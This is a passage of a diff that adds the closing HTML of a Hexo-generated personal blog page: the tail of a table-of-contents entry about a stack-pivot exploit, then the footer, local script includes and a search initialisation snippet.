栈迁移方法的EXP</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+
+
+						</div>
+
+						
+
+			</div><!-- row -->
+
+			<!--
+ -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+    &copy; 2025
+      鎏柏鱼's Blog
+        
+                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
+                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
